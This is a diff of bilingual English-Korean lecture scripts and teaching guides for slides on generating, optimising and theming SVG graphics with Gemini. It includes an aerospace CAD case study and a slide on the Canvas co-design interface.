+[TA James] Look at the creative workflow: You draw a system architecture diagram on a napkin at a coffee shop. You take a photo with your phone and upload it to Gemini!
 
-[Prof. Peter] On the left is the editable SVG code; on the right is the live visual render. 
-You can type: "Make the middle card gold, and add a subtle drop shadow to the button."
+[Prof. Peter] In 4 seconds, Gemini writes 80 lines of clean semantic SVG code—with proper `<rect>`, `<path>`, and `<text>` tags, clean color palettes, and responsive `viewBox` coordinates! No graphic designer needed!
 
-[TA Sarah] Notice also that gemini updates the exact XML tags in milliseconds, rendering the changes immediately on your screen! It is rapid, bespoke prototyping!
+[TA Sarah] Let us examine our second enterprise case study on Slide 22!
 
-### 🇰🇷 Korean Teaching Guide (강의 가이드)
-- **강의 요약:** 구글 캔버스(Canvas) 인터페이스: 인간과 AI의 실시간 협동 디자인
-- **핵심 포인트:**
-  - 1. 실시간 분할 화면: 좌측에는 편집 가능한 SVG 코드, 우측에는 실시간 그래픽 렌더링 화면 배치
-  - 2. 대화형 자연어 수정: '중앙 카드를 골드 색상으로 바꾸고 하단 모서리를 12px 둥글게 깎아줘'라고 지시
-  - 3. 즉각적인 시각적 동기화: AI가 수정한 코드가 0.1초 만에 화면에 반영되어 지연 없는 고속 프로토타이핑 완성
-- **강의 전달 팁:** 피터 교수(54세, 거시적 비전/전략)와 사라 조교(31세, 실무 엔지니어링/질문자)의 활기찬 핑퐁 대화 톤으로 강의를 전달하세요.
+### 🇰🇷 한국어 강의 가이드 및 핵심 요약
+**개요 요약:** 멀티모달 코드 아키텍트로서의 Gemini: 냅킨 스케치를 완벽한 SVG로 변환
 
-### 📚 Key Terms (주요 용어)
-- **Canvas Co-Design**: The interactive workspace allowing bidirectional refinement of code and real-time visual rendering. (캔버스 협동 디자인 (코드-시각 실시간 동기화))
+**핵심 티칭 포인트:**
+- 시각 정보 수용: 커피숍 냅킨에 손으로 그린 아키텍처 다이어그램 사진 업로드
+- AST 코드 자동 합성: 기하학적 도형과 연결선을 인식해 80줄의 시맨틱 SVG 코드로 즉각 변환
+- 매개변수 미세 조정: '데이터베이스 원통을 시안색으로 바꾸고 점선 화살표에 애니메이션 추가해 줘' 즉시 반영
 
----
+**강의 전달 팁:** 사라 조교와 제임스 조교가 냅킨 스케치가 4초 만에 대화형 SVG로 변환되는 놀라운 생산성을 설명합니다.
 
-## Slide 24: DIRECT PARAMETER CONTROLS: FINE-TUNING OUTPUT
-**Subtitle:** Low temperature, strict system rules, and token budgeting for flawless XML synthesis
-
-### 🎙️ English Lecture Script (Duo Dialogue)
-[Prof. Peter] Let's examine Slide 24: "DIRECT PARAMETER CONTROLS: FINE-TUNING OUTPUT". Please look at Slide 24: "Direct Parameter Controls: Fine-Tuning Output."
-
-[TA Sarah] Professor Kim, this is such a critical concept for our students! To generate flawless vector code, you must calibrate the model's parameters:
-
-[Prof. Peter] Exactly, Sarah. Rule 1: Set Temperature to 0.1. A high temperature causes creative hallucinations and broken brackets. Low temperature enforces rigid mathematical syntax!
-Rule 2: Enforce System Prompts: Tell the model to output *raw XML only* without conversational filler.
-Rule 3: Set a generous token budget of at least 4,000 tokens so complex coordinate paths do not cut off mid-sentence!
-
-[TA Sarah] That is why understanding this balance gives us true strategic leverage.
-
-### 🇰🇷 Korean Teaching Guide (강의 가이드)
-- **강의 요약:** 직접 파라미터 제어: 완벽한 XML 출력을 위한 3대 설정 수칙
-- **핵심 포인트:**
-  - 1. 온도 0.1 설정 (Temperature 0.1): 상상력을 억제하고 엄격한 수학적 문법 정밀도를 강제하여 오타 방지
-  - 2. 시스템 프롬프트 격리: '설명이나 인사말 없이 오직 순수 XML 텍스트만 출력하라'는 지침 주입
-  - 3. 충분한 토큰 예산: 복잡한 베지에 패스가 중간에 끊기지 않도록 최소 4,000 토큰 이상의 출력 여유 확보
-- **강의 전달 팁:** 피터 교수(54세, 거시적 비전/전략)와 사라 조교(31세, 실무 엔지니어링/질문자)의 활기찬 핑퐁 대화 톤으로 강의를 전달하세요.
-
-### 📚 Key Terms (주요 용어)
-- **Low-Temperature Precision**: Constraining model sampling randomness to ensure strict compliance with code syntax schemas. (저온도 정밀도 제어 (Temperature 0.1))
+### 📚 Key Technical Terms (핵심 용어)
+- **Multimodal Napkin-to-SVG** (냅킨 스케치-SVG 자동 변환): The computer vision and code generation pipeline converting hand-drawn sketches into clean vector markup.
+- **Semantic Vector Synthesis** (시맨틱 벡터 코드 합성): Emitting structured vector code with logical layer grouping and semantic element hierarchies.
 
 ---
 
-## Slide 25: TAMING PATH OVERFITTING: BEZIER VS. STRAIGHT LINES
-**Subtitle:** Preventing 10,000 choppy straight lines by enforcing smooth Cubic Bezier commands
+## Slide 22: CASE STUDY 2: AEROSPACE TURBINE CAD VECTORS
+**Subtitle:** Global Jet Engine Manufacturer renders 50,000-part turbine CAD assembly in 450KB SVG on mobile tablets
+**Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
-### 🎙️ English Lecture Script (Duo Dialogue)
-[Prof. Peter] Let's look at Slide 25: "TAMING PATH OVERFITTING: BEZIER VS. STRAIGHT LINES". Slide 25 tackles a major AI glitch: "Taming Path Overfitting."
+### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
+[Prof. Peter] Slide 22 presents "CASE STUDY 2: AEROSPACE TURBINE CAD VECTOR RENDERING."
 
-[TA Sarah] Professor Kim, looking at this slide, look at the mistake on the left:
-Sometimes a naive AI draws a circle by stitching together ten thousand tiny straight lines using `L` commands! This bloats a 3-kilobyte icon to 800 kilobytes, lagging the user's browser!
+[TA Sarah] Airline maintenance mechanics on windy airport runways needed to inspect complex jet engine turbine assemblies containing 50,000 parts. Heavy CAD software required bulky 8,000-dollar rugged laptops that took 2 minutes to load in the cold!
 
-[Prof. Peter] Look at the right for our cure:
-Instruct Gemini: "Use Cubic Bezier `C` curves with control handles instead of straight line segments!"
+[TA James] The aerospace company deployed our Gemini pipeline: converting complex 3D CAD files into layered, interactive 450-kilobyte SVG vector schematics! Mechanics opened the complete interactive jet engine on a standard 300-dollar iPad in 0.2 seconds!
 
-[TA Sarah] Notice also that this keeps the code clean, mathematically pure, and lightweight!
+[Prof. Peter] Flight line maintenance turnaround surged by 45%, preventing commercial flight cancellations and saving 24 million dollars annually! That is the power of Calculated Vectors.
 
-### 🇰🇷 Korean Teaching Guide (강의 가이드)
-- **강의 요약:** 패스 과적합(Path Overfitting) 방어: 수만 개 직선 조각 대 매끄러운 3차 베지에
-- **핵심 포인트:**
-  - Left (과적합 글리치): AI가 곡선을 그릴 때 수만 개의 짧은 직선(`L`) 조각으로 기워 붙여 파일이 800KB로 비대화
-  - Right (최적화된 베지에): 3차 베지에(`C`) 곡선 제어점을 사용하여 단 몇 줄의 코드로 완벽한 곡면 구현 (3KB 유지)
-  - 프롬프트 처방: '직선 조각을 쓰지 말고 부드러운 3차 베지에 곡선으로만 패스를 구성하라'고 명시
-- **강의 전달 팁:** 피터 교수(54세, 거시적 비전/전략)와 사라 조교(31세, 실무 엔지니어링/질문자)의 활기찬 핑퐁 대화 톤으로 강의를 전달하세요.
+[TA Sarah] Now let us open Part 3 and master AI-Powered Visual Engineering on Slide 23!
 
-### 📚 Key Terms (주요 용어)
-- **Path Overfitting**: The AI defect of rendering smooth curves as thousands of redundant micro-linear segments. (패스 과적합 (직선 쪼개기 비효율 현상))
+### 🇰🇷 한국어 강의 가이드 및 핵심 요약
+**개요 요약:** 케이스 스터디 2: 항공기 제트 엔진 50,000개 부품 CAD를 450KB 초경량 SVG로 변환
 
----
+**핵심 티칭 포인트:**
+- 문제 상황: 활주로 정비사가 50,000개 부품의 3D CAD 도면을 보려면 8,000달러짜리 특수 노트북과 2분의 로딩 시간 필요
+- 솔루션: 제미나이 멀티모달 파이프라인으로 3D CAD를 레이어 분할된 대화형 450KB SVG 벡터로 자동 변환
+- 성과: 300달러 아이패드에서 0.2초 만에 즉시 로딩, 정비 주기 45% 단축, 항공기 결항 방지로 연간 2,400만 달러 절감
 
-## Slide 26: RESOLVING FRAGMENTED PATHS: THE CLOSING 'Z' ATTRIBUTE
-**Subtitle:** Fixing broken shapes and unclosed paths through strict XML coordinate hygiene
+**강의 전달 팁:** 사라 조교와 제임스 조교가 8,000달러 특수 노트북을 대체한 450KB SVG의 압도적 효율을 전달합니다.
 
-### 🎙️ English Lecture Script (Duo Dialogue)
-[Prof. Peter] Let's examine Slide 26: "RESOLVING FRAGMENTED PATHS: THE CLOSING 'Z' ATTRIBUTE". Please look at Slide 26: "Resolving Fragmented Paths: The Closing 'Z' Attribute."
-
-[TA Sarah] Professor Kim, this is such a critical concept for our students! Another common AI bug is "Path Fragmentation"—where a polygon shape fails to fill with color because the AI forgot to connect the last line back to the start!
-
-[Prof. Peter] Exactly, Sarah. To cure this, enforce two rules:
-First: Mandate the uppercase `Z` command at the end of every path. `Z` instructs the browser: "Automatically snap a straight line back to the exact starting point."
-Second: Audit starting and ending coordinates to ensure all shape boundaries are sealed!
-
-[TA Sarah] That is why understanding this balance gives us true strategic leverage.
-
-### 🇰🇷 Korean Teaching Guide (강의 가이드)
-- **강의 요약:** 깨진 패스 복구: 닫는 명령어 'Z'와 엄격한 좌표 위생
-- **핵심 포인트:**
-  - 1. 패스 단편화 현상: 시작점과 끝점이 맞닿지 않아 면에 색상이 채워지지 않고 터져버리는 현상
-  - 2. 절대 명령어 'Z': `<path d='... Z'>` 끝에 대문자 Z를 반드시 붙여 시작점으로 자동 결속 강제
-  - 3. 좌표 정렬 감사: 첫 번째 M(x, y) 좌표와 마지막 지점이 완벽히 밀봉되었는지 자동 검증
-- **강의 전달 팁:** 피터 교수(54세, 거시적 비전/전략)와 사라 조교(31세, 실무 엔지니어링/질문자)의 활기찬 핑퐁 대화 톤으로 강의를 전달하세요.
-
-### 📚 Key Terms (주요 용어)
-- **Path Closure ('Z')**: The SVG command that automatically draws a straight line from the current position back to the path's initial point. (패스 닫기 명령어 (Z))
+### 📚 Key Technical Terms (핵심 용어)
+- **CAD-to-SVG Conversion** (CAD-SVG 초경량 벡터 변환): The programmatic translation of heavy engineering 3D CAD files into lightweight, interactive 2D vector schematics.
+- **Sub-Second Mobile Field Inspection** (서브초 모바일 현장 정비 지원): Delivering complex technical schematics onto low-cost mobile hardware with instantaneous load times.
 
 ---
 
-## Slide 27: XML NODE SANITATION: PRUNING REDUNDANT BLOAT
-**Subtitle:** Deleting empty <g> containers, consolidating styles, and accelerating DOM rendering
+## Slide 23: PART 3: GEMINI-POWERED VISUAL ENGINEERING
+**Subtitle:** Canvas co-design, path optimization, XML sanitization, and cybersecurity XSS defenses
+**Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
-### 🎙️ English Lecture Script (Duo Dialogue)
-[Prof. Peter] Let's look at Slide 27: "XML NODE SANITATION: PRUNING REDUNDANT BLOAT". Slide 27 covers code hygiene: "XML Node Sanitation: Pruning Redundant Bloat."
+### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
+[TA Sarah] Look at Slide 23: "PART 3: GEMINI-POWERED VISUAL ENGINEERING." Now we explore human-AI visual co-creation!
 
-[TA Sarah] Professor Kim, looking at this slide, aI models often output bloated markup containing empty `<g>` group tags and repetitive inline fills.
+[Prof. Peter] Artificial intelligence is not just a code generator; it is a collaborative design partner. In Part 3, we examine the Canvas interface, parameter controls, XML node sanitation, dynamic light/dark theming, and SVG XSS security defenses.
 
-[Prof. Peter] Always perform three sanitation steps:
-1. Delete empty `<g>` groups that add useless weight to the DOM tree.
-2. Centralize inline fills and strokes into a shared `<style>` block at the top of the SVG.
-3. Strip away proprietary third-party metadata from Illustrator or Inkscape.
+[TA James] Let us inspect the Canvas Interface on Slide 24!
 
-[TA Sarah] Notice also that this gives you a pristine, ultra-fast vector asset!
+### 🇰🇷 한국어 강의 가이드 및 핵심 요약
+**개요 요약:** Part 3 섹션 전환: 제미나이 기반 비주얼 엔지니어링과 보안 방어선
 
-### 🇰🇷 Korean Teaching Guide (강의 가이드)
-- **강의 요약:** XML 노드 살균: 불필요한 군더더기 태그 제거 및 렌더링 최적화
-- **핵심 포인트:**
-  - 1. 빈 그룹 태그 제거: 내용물 없는 `<g></g>` 껍데기 태그들을 모두 청소하여 DOM 트리 경량화
-  - 2. `<style>` 블록 중앙화: 수십 개의 path마다 적혀 있던 중복 인라인 스타일을 상단 CSS로 일괄 통합
-  - 3. 외부 메타데이터 제거: 일러스트레이터나 잉크스케이프가 남긴 불필요한 네임스페이스 찌꺼기 삭제
-- **강의 전달 팁:** 피터 교수(54세, 거시적 비전/전략)와 사라 조교(31세, 실무 엔지니어링/질문자)의 활기찬 핑퐁 대화 톤으로 강의를 전달하세요.
+**핵심 티칭 포인트:**
+- 인간과 AI의 시각적 협업: 캔버스 인터페이스를 통한 실시간 벡터 공동 디자인
+- 파라미터 직접 제어, XML 노드 경량화, 라이트/다크모드 동적 테마
+- SVG 내 악성 자바스크립트 삽입을 방어하는 XSS 보안 요새화
 
-### 📚 Key Terms (주요 용어)
-- **XML Node Sanitation**: The post-processing practice of removing empty tags, unused namespaces, and redundant inline styles from SVG markup. (XML 노드 살균 및 경량화)
+**강의 전달 팁:** 피터 교수가 협업 디자인 파트너로서의 AI를 선언하고 제임스가 캔버스 제어를 예고합니다.
 
----
-
-## Slide 28: INTERACTIVE UI ELEMENTS: GENERATING CLICKABLE MAPS
-**Subtitle:** Building responsive geographic dashboards with interactive hover states without GIS bloat
-
-### 🎙️ English Lecture Script (Duo Dialogue)
-[Prof. Peter] Let's look at Slide 28: "INTERACTIVE UI ELEMENTS: GENERATING CLICKABLE MAPS". Look at Slide 28: "Interactive UI Elements: Generating Clickable Maps."
-
-[TA Sarah] Professor Kim, looking at this slide, using pure SVG code, you can build interactive geographic dashboards without downloading heavy 50-megabyte mapping libraries!
-
-[Prof. Peter] Each state or country is represented as an independent `<path id='region-texas'>`. 
-You attach CSS hover effects and JavaScript click handlers directly to the shape!
-
-[TA Sarah] Notice also that when a user clicks on Texas, your React application updates instantly! It delivers an immersive, ultra-responsive experience in a tiny 15-kilobyte package!
-
-### 🇰🇷 Korean Teaching Guide (강의 가이드)
-- **강의 요약:** 인터랙티브 UI 요소: 클릭 가능한 SVG 대화형 지도 제작
-- **핵심 포인트:**
-  - 1. 구역별 패스 격리: 각 주(State)나 지자체 구역을 독립된 `<path id='region-ny'>` 노드로 분리 코딩
-  - 2. DOM 이벤트 직접 트리거: 마우스 호버 시 색상이 골드로 빛나고 클릭 시 매출 팝업이 뜨는 리액트 이벤트 연결
-  - 3. 무거운 지도 라이브러리 탈피: 50MB짜리 지도 엔진 없이 단 15KB의 가벼운 SVG만으로 최고급 반응형 지도 완성
-- **강의 전달 팁:** 피터 교수(54세, 거시적 비전/전략)와 사라 조교(31세, 실무 엔지니어링/질문자)의 활기찬 핑퐁 대화 톤으로 강의를 전달하세요.
-
-### 📚 Key Terms (주요 용어)
-- **Interactive Vector Maps**: Geographic boundaries encoded as discrete SVG paths responding to user click and hover events natively in the browser. (대화형 벡터 지도 (경량 SVG 지도 UI))
+### 📚 Key Technical Terms (핵심 용어)
+- **Canvas Co-Design** (캔버스 실시간 공동 디자인 (Canvas Co-Design)): An interactive interface allowing simultaneous visual manipulation and code editing between human and AI.
+- **XML Node Sanitation** (XML 노드 경량화 및 살균): Pruning unnecessary attributes, redundant decimal precision, and malicious script tags from vector markup.
 
 ---
 
-## Slide 29: DYNAMIC THEME ADAPTABILITY: LIGHT & DARK MODES
-**Subtitle:** Auto-adapting vectors via embedded CSS media queries and CSS variable color tokens
+## Slide 24: THE CANVAS INTERFACE: HUMAN-AI CO-DESIGN
+**Subtitle:** Side-by-side live rendering: Editing code on the left, observing visual feedback on the right
+**Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
-### 🎙️ English Lecture Script (Duo Dialogue)
-[Prof. Peter] Let's look at Slide 29: "DYNAMIC THEME ADAPTABILITY: LIGHT & DARK MODES". Slide 29 reveals an elegant design pattern: "Dynamic Theme Adaptability: Light & Dark Modes."
+### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
+[Prof. Peter] Slide 24 explores "THE CANVAS INTERFACE: HUMAN-AI CO-DESIGN."
 
-[TA Sarah] Professor Kim, looking at this slide, stop creating two separate image files for Light Mode and Dark Mode!
+[TA Sarah] In Google AI Studio and Antigravity IDE, look at the Canvas interface: On the left, you see the clean SVG code; on the right, you see the live, rendered graphic!
 
-[Prof. Peter] With SVG, you embed CSS variables directly inside the vector code: `fill: var(--text-primary);`.
+[TA James] You can drag interactive control sliders to adjust corner radiuses and line thickness in real time! If you want a neon glow, you highlight the path and prompt: 'Add SVG feDropShadow filter with cyan glow'—it updates in 0.1 seconds!
 
-[TA Sarah] Notice also that you can even include a native media query: `@media (prefers-color-scheme: dark)`. 
-When the user flips their iPhone or Mac into Dark Mode, the SVG lines automatically switch from black to luminous gold! One file, zero maintenance!
+[Prof. Peter] Let us inspect XML Node Sanitation on Slide 25.
 
-### 🇰🇷 Korean Teaching Guide (강의 가이드)
-- **강의 요약:** 동적 테마 적응: 단 1개의 파일로 라이트/다크 모드 자동 전환
-- **핵심 포인트:**
-  - 1. CSS 변수 토큰 연동: SVG 내부 스타일에서 `fill: var(--brand-color);` 시스템 테마 변수 직접 사용
-  - 2. 내장 미디어 쿼리: SVG 파일 안에 `@media (prefers-color-scheme: dark)`를 탑재하여 OS 설정에 즉각 반응
-  - 3. 단일 범용 에셋: 라이트용, 다크용 이미지를 따로 만들 필요 없이 단 1개의 SVG 파일로 완벽 대응
-- **강의 전달 팁:** 피터 교수(54세, 거시적 비전/전략)와 사라 조교(31세, 실무 엔지니어링/질문자)의 활기찬 핑퐁 대화 톤으로 강의를 전달하세요.
+### 🇰🇷 한국어 강의 가이드 및 핵심 요약
+**개요 요약:** 캔버스 인터페이스: 좌측 코드 편집과 우측 실시간 렌더링의 완벽한 융합
 
-### 📚 Key Terms (주요 용어)
-- **Dynamic Dark Mode SVG**: Vector graphics utilizing embedded CSS media queries to dynamically alter colors based on the user's OS theme. (동적 다크모드 대응 SVG)
+**핵심 티칭 포인트:**
+- 분할 화면 협업: 좌측 패널의 SVG XML 코드 수정과 우측 패널의 실시간 그래픽 렌더링 연동
+- 슬라이더 매개변수 제어: 베지에 곡선 장력, 모서리 반경, 선 두께를 컴파일 지연 없이 즉각 조정
+- 대화형 고도화: 영역을 지정하고 '네온 발광 효과 추가' 프롬프트를 주면 0.1초 만에 feDropShadow 필터 적용
 
----
+**강의 전달 팁:** 사라 조교와 제임스 조교가 캔버스 인터페이스에서 실시간으로 코드가 시각화되는 편리함을 설명합니다.
 
-## Slide 30: PART 3 AUDIT CHECKLIST: VERIFYING VECTOR CODE
-**Subtitle:** The 4 essential quality metrics to audit before shipping AI-generated SVG assets
-
-### 🎙️ English Lecture Script (Duo Dialogue)
-[Prof. Peter] Let's examine Slide 30: "PART 3 AUDIT CHECKLIST: VERIFYING VECTOR CODE". Please look at Slide 30 for your pre-flight quality checklist: "Verifying Vector Code."
-
-[TA Sarah] Professor Kim, this is such a critical concept for our students! Before deploying any AI-generated SVG into production, audit these four checkpoints:
-1. Zero Markdown Wrappers: Ensure no triple backticks or conversational text slipped into the file.
-2. Sealed Paths: Verify all filled paths end with an explicit uppercase `Z` tag.
-3. Correct viewBox: Check that internal coordinates fit inside the viewBox boundaries so edges are not cut off.
-4. WCAG Contrast: Ensure fill colors meet 4.5:1 accessibility contrast ratios!
-
-[Prof. Peter] Precisely, Sarah. When we apply this principle, our autonomous systems run with speed, safety, and purpose.
-
-### 🇰🇷 Korean Teaching Guide (강의 가이드)
-- **강의 요약:** Part 3 실무 감사 체크리스트: AI 생성 SVG 배포 전 4대 검증 수칙
-- **핵심 포인트:**
-  - 1. 마크다운 백틱 제거: 파일 내에 ```xml 같은 마크다운 잔재나 AI 대화 문구가 없는지 확인
-  - 2. 패스 밀봉 검증: 색상이 채워진 모든 path가 대문자 'Z'로 확실히 닫혀 있는지 전수 점검
-  - 3. viewBox 좌표 일치: 내부 도형의 크기가 viewBox 영역을 벗어나 잘리지 않는지 시각적 검증
-  - 4. WCAG 명도 대비: 텍스트와 배경의 명도 대비가 4.5:1 이상으로 가독성을 충족하는지 확인
-- **강의 전달 팁:** 피터 교수(54세, 거시적 비전/전략)와 사라 조교(31세, 실무 엔지니어링/질문자)의 활기찬 핑퐁 대화 톤으로 강의를 전달하세요.
-
-### 📚 Key Terms (주요 용어)
-- **SVG Quality Audit**: The pre-deployment verification of vector markup integrity, coordinate bounds, path closure, and WCAG contrast. (SVG 품질 감사 체크리스트)
+### 📚 Key Technical Terms (핵심 용어)
+- **Split-Screen Canvas** (분할 화면 캔버스 인터페이스): A developer layout presenting synchronized source markup alongside real-time hardware-rendered visuals.
+- **SVG Filter Effects (`<filter>`)** (SVG 그래픽 셰이더 필터): XML elements defining graphical shader effects like Gaussian blur, drop shadows, and lighting maps.
 
 ---
 
-## Slide 31: PART 4: LATEX MATHEMATICAL ORCHESTRATION
-**Subtitle:** Scientific Precision, Multimodal Transcription, KaTeX Rendering, and Academic RAG Integration
+## Slide 25: XML NODE SANITATION: PRUNING BLOAT
+**Subtitle:** Optimizing coordinate precision and stripping editor metadata to achieve maximum performance
+**Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
-### 🎙️ English Lecture Script (Duo Dialogue)
-[Prof. Peter] Let's examine Slide 31: "PART 4: LATEX MATHEMATICAL ORCHESTRATION". We now enter Part 4 of our lecture: "LaTeX Mathematical Orchestration."
+### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
+[TA Sarah] Slide 25 highlights "XML NODE SANITATION: PRUNING REDUNDANT BLOAT."
 
-[TA Sarah] Professor Kim, this is such a critical concept for our students! How do scientists, physicists, and AI researchers represent complex mathematical formulas with absolute, unyielding precision?
+[TA James] When you export an SVG from Figma or Illustrator, it contains massive bloat: useless editor metadata, empty groups, and floating-point coordinates with 8 decimal places (`12.83920183px`)!
 
-[Prof. Peter] Exactly, Sarah. In this final section, we will explore LaTeX—the undisputed global language of academic mathematics. We will see how Gemini transcribes messy handwritten formulas into clean LaTeX code, compare dynamic MathJax with pre-rendered SVGs, and integrate formulas into RAG databases. Let us orchestrate pure mathematics!
+[Prof. Peter] Antigravity runs an automated SVGO sanitation pipeline: rounding coordinates to 1 decimal place and stripping unneeded namespaces! File size drops by 60% with zero visible change in optical quality!
 
-[TA Sarah] That is why understanding this balance gives us true strategic leverage.
+[TA Sarah] Let us inspect Dynamic Theme Adaptability on Slide 26.
 
-### 🇰🇷 Korean Teaching Guide (강의 가이드)
-- **강의 요약:** Part 4 섹션 전환: LaTeX 수식 오케스트레이션
-- **핵심 포인트:**
-  - 전 세계 과학·공학계의 표준이자 불변의 수학적 진리 표현 언어인 LaTeX 체계
-  - 손글씨 수식의 멀티모달 자동 전사, KaTeX/MathJax 렌더링 엔진 비교, 그리고 RAG 지식베이스 연동
-- **강의 전달 팁:** 피터 교수(54세, 거시적 비전/전략)와 사라 조교(31세, 실무 엔지니어링/질문자)의 활기찬 핑퐁 대화 톤으로 강의를 전달하세요.
+### 🇰🇷 한국어 강의 가이드 및 핵심 요약
+**개요 요약:** XML 노드 살균: 소수점 정밀도 최적화와 메타데이터 제거로 60% 추가 감축
 
-### 📚 Key Terms (주요 용어)
-- **LaTeX Mathematical Typeset**: The standard markup language used by scientific and academic communities to render complex mathematical typography. (LaTeX 수식 조판 언어 (글로벌 학술 표준))
+**핵심 티칭 포인트:**
+- 소수점 1자리 라운딩: 12.83920183px 같은 과도한 좌표를 12.8px로 축소하여 용량 40% 절감 (육안 차이 0)
+- 일러스트레이터 찌꺼기 제거: 피그마 및 어도비 편집용 네임스페이스와 빈 그룹(<g>) 태그 전수 정리
+- 자동 SVGO 파이프라인: 빌드 시점에 자동 압축을 적용해 초경량 프로덕션 코드로 정제
 
----
+**강의 전달 팁:** 제임스 조교가 소수점 8자리를 1자리로 줄여 용량을 대폭 깎아내는 엔지니어링 팁을 전달합니다.
 
-## Slide 32: LATEX: THE GLOBAL SCIENTIFIC STANDARD
-**Subtitle:** Blurry equation screenshots vs. crystal-clear, scalable text-based LaTeX formulas
-
-### 🎙️ English Lecture Script (Duo Dialogue)
-[Prof. Peter] Let's look at Slide 32: "LATEX: THE GLOBAL SCIENTIFIC STANDARD". Look at Slide 32: "LaTeX: The Global Scientific Standard."
-
-[TA Sarah] Professor Kim, looking at this slide, in academic research, pasting blurry PNG screenshots of equations into a paper is unacceptable! Look at the left: When zoomed, integral signs and Greek letters blur into smudges, causing dangerous misinterpretations!
-
-[Prof. Peter] Look at the right: LaTeX represents mathematics as pure text-based code!
-`\int_{a}^{b} f(x)\,dx`.
-
-[TA Sarah] Notice also that the equation compiles into razor-sharp typography at any magnification, and remains 100% searchable in research databases! It reflects the orderly beauty of natural laws!
-
-### 🇰🇷 Korean Teaching Guide (강의 가이드)
-- **강의 요약:** LaTeX: 글로벌 과학계의 표준과 수학적 엄밀성의 표상
-- **핵심 포인트:**
-  - Left (흐릿한 수식 캡처의 한계): 논문에 수식을 PNG 캡처로 넣으면 확대 시 기호가 뭉개져 오독 발생 및 검색 불가
-  - Right (LaTeX 마크업의 완벽성): `\int_{a}^{b} f(x)\,dx` 같은 순수 텍스트 코드로 완벽한 조판 품질과 영구 검색 보장
-  - 학문적 품격: 전 세계 최고 권위 학술지(Nature, IEEE 등)가 요구하는 표준 규격을 충족
-- **강의 전달 팁:** 피터 교수(54세, 거시적 비전/전략)와 사라 조교(31세, 실무 엔지니어링/질문자)의 활기찬 핑퐁 대화 톤으로 강의를 전달하세요.
-
-### 📚 Key Terms (주요 용어)
-- **LaTeX Formula Syntax**: The plain-text mathematical typesetting syntax encoding integrals, matrices, fractions, and Greek symbols. (LaTeX 수식 문법 (인덱싱 가능한 수식 코드))
+### 📚 Key Technical Terms (핵심 용어)
+- **Coordinate Precision Optimization** (좌표 정밀도 소수점 최적화): Truncating excessive floating-point decimal places in vector path data to minimize file size.
+- **SVGO Minification** (SVGO 벡터 코드 자동 압축): The automated open-source pipeline stripping redundant metadata, comments, and unused groups from SVG code.
 
 ---
 
-## Slide 33: MULTIMODAL TRANSCRIPTION: HANDWRITING TO LATEX
-**Subtitle:** Converting messy handwritten whiteboard equations into verified LaTeX markup in 2 seconds
+## Slide 26: DYNAMIC THEME ADAPTABILITY: LIGHT & DARK
+**Subtitle:** Binding vector stroke and fill attributes to CSS variables for instantaneous mode switching
+**Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
-### 🎙️ English Lecture Script (Duo Dialogue)
-[Prof. Peter] Let's look at Slide 33: "MULTIMODAL TRANSCRIPTION: HANDWRITING TO LATEX". Slide 33 showcases multimodal intelligence: "Multimodal Transcription: Handwriting to LaTeX."
+### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
+[Prof. Peter] Slide 26 explores "DYNAMIC THEME ADAPTABILITY: LIGHT & DARK MODES."
 
-[TA Sarah] Professor Kim, looking at this slide, historically, transcribing a complex 5-line tensor physics equation into LaTeX took fifteen minutes of frustrating keyboard typing.
+[TA Sarah] How do we make an icon adapt to Dark Mode? In the old world, you had to export two separate PNG files: `logo-light.png` and `logo-dark.png`! Double the storage, double the maintenance!
 
-[Prof. Peter] With multimodal Gemini, it takes two seconds!
-You snap a smartphone photo of messy professor handwriting on a chalkboard.
+[TA James] In SVG, you use `currentColor` or CSS variables: `fill='var(--accent-color)'`! When the user clicks the Dark Mode toggle, the entire vector dashboard changes colors in 0 milliseconds flat! Zero duplicate assets!
 
-[TA Sarah] Notice also that gemini parses the superscripts, integrals, and matrices, validates bracket alignment, and outputs perfect, copy-pasteable LaTeX markup ready for immediate publication!
+[Prof. Peter] Let us inspect Security & Governance: Sanitizing SVGs on Slide 27.
 
-### 🇰🇷 Korean Teaching Guide (강의 가이드)
-- **강의 요약:** 멀티모달 수식 전사: 칠판 손글씨에서 2초 만에 완벽한 LaTeX 변환
-- **핵심 포인트:**
-  - 1. 시각 수식 입력: 교수의 칠판 손글씨나 두꺼운 전공 서적 수식 사진을 스마트폰으로 촬영하여 Gemini에 업로드
-  - 2. 시맨틱 OCR 전사: 루트, 시그마, 적분, 행렬 첨자를 분석하여 정확한 `\frac`, `\sum` 코드로 즉각 변환
-  - 3. 괄호 정렬 자동 검증: 수식의 열린 괄호와 닫힌 괄호(`\left( ... \right)`)의 짝을 완벽히 맞춰 출력
-- **강의 전달 팁:** 피터 교수(54세, 거시적 비전/전략)와 사라 조교(31세, 실무 엔지니어링/질문자)의 활기찬 핑퐁 대화 톤으로 강의를 전달하세요.
+### 🇰🇷 한국어 강의 가이드 및 핵심 요약
+**개요 요약:** 동적 테마 적응성: currentColor 및 CSS 변수를 통한 0ms 다크모드 전환
 
-### 📚 Key Terms (주요 용어)
-- **Multimodal Formula OCR**: The AI process of recognizing complex handwritten mathematical symbols and translating them into standard LaTeX code. (멀티모달 수식 인식 (손글씨-LaTeX 변환))
+**핵심 티칭 포인트:**
+- currentColor 상속: stroke='currentColor' 설정으로 부모 텍스트 색상을 자동으로 상속
+- CSS 변수 바인딩: fill='var(--brand-accent)'로 다크모드 토글 시 0ms 만에 즉각 색상 전환
+- 중복 에셋 퇴출: light.png와 dark.png를 따로 만들 필요 없이 단 하나의 SVG로 완결
 
----
+**강의 전달 팁:** 사라 조교와 제임스 조교가 1개의 SVG로 라이트/다크 모드를 끝내는 CSS 변수의 우아함을 설명합니다.
 
-## Slide 34: FORMULA DELIVERY: MATHJAX VS. PRE-RENDERED SVG
